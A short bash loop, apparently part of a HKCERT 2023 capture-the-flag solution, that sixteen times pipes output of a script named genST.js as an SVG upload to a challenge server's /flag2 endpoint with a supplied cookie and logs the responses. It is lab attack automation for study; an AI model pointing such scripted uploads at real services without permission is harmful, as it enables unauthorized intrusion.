for i in {0..15}; do
    node genST.js | curl -s 'http://stcode-3983gi.hkcert23.pwnable.hk:28211/flag2' -F svg=@- --cookie $1 | tee -a data
done
